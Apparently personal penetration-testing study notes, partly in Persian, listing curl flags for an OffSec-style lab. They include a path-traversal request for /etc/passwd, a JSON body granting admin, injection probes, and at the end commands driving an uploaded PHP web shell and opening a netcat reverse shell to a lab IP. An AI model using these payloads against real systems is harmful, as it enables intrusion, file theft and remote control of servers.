```basg
curl --path-as-is http://IP:443/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
```
	-i, --show-headers
	-T, --upload-file file
	-A, --user-agent name
	-d, POST => {"...":"...","...":"..."}  =>  '{"password":"lab","username":"offsec","email":"pwn@offsec.com","admin":"True"}'
	-H,    =>  -H 'Cnontent-Type:application/json' -H 'Authorization: OAuth' 
	-X POST --data 'Archive=ipconfig'
	robot.txt
	&& => %3B

```bash
curl -s https://example.com | wc -c
```

```bash
curl -s "https://example.com?id=1" > a.html
```
```basg
curl -s "https://example.com?id=1 AND 1=2" > b.html
```
```bash
diff -u a.html b.html
```

| Flag             | توضیح                               |
| ---------------- | ----------------------------------- |
| `-L`             | دنبال کردن ریدایرکت‌ها              |
| `--max-redirs 0` | جلوگیری کامل از دنبال کردن ریدایرکت |
| `--max-redirs 1` | دنبال کردن فقط یک ریدایرکت          |

فلگ‌های نمایش خروجی

| فلگ        | توضیح ساده                            |
| ---------- | ------------------------------------- |
| `-s`       | حالت سایلنت (هیچی چاپ نکنه)           |
| `-S`       | نمایش خطا (معمولاً با `-s`)           |
| `-v`       | verbose → نمایش کامل request/response |
| `-i`       | نمایش هدر + بادی پاسخ                 |
| `-I`       | فقط هدر (HEAD request)                |
| `-o file`  | ذخیره خروجی در فایل                   |
| `-O`       | ذخیره با اسم فایل اصلی                |
| `-D file`  | ذخیره هدرها در فایل                   |
| `-w "..."` | چاپ اطلاعات مثل زمان و سایز           |
| -k         | ignore SSL certificate                |
فلگ‌های متد و ارسال دیتا

| فلگ                | توضیح ساده                         |
| ------------------ | ---------------------------------- |
| `-X GET`           | تعیین متد                          |
| `-X POST`          | ارسال POST                         |
| `-d "a=1"`         | ارسال POST data                    |
| `--data-raw`       | ارسال دیتا بدون encode             |
| `--data-binary`    | ارسال raw کامل (برای payload حساس) |
| `-G`               | تبدیل `-d` به GET                  |
| `--data-urlencode` | URL encode امن                     |
فلگ‌های هدر و کوکی

| فلگ              | توضیح ساده   |
| ---------------- | ------------ |
| `-H "H: v"`      | هدر دستی     |
| `-A "UA"`        | User-Agent   |
| `-e URL`         | Referer      |
| `-b "a=1"`       | ارسال Cookie |
| `-b file.txt`    | کوکی از فایل |
| `-c cookies.txt` | ذخیره کوکی   |
| `--compressed`   | قبول gzip/br |
فلگ‌های Redirect

|فلگ|توضیح ساده|
|---|---|
|`-k`|ignore SSL error|
|`--http1.1`|اجبار HTTP/1.1|
|`--http2`|استفاده از HTTP/2|


```cmd
curl http://192.168.50.11/project/uploads/users/420919-backdoor.php?cmd=whoami
```

nc is installed on the target
```cmd
curl http://192.168.50.11/project/uploads/users/420919-backdoor.php --data-urlencode "cmd=which nc"
```

The reverse netcat
```cmd 
curl http://192.168.50.11/project/uploads/users/420919-backdoor.php --data-urlencode "cmd=nc -nv 192.168.50.129 6666 -e /bin/bash"
```

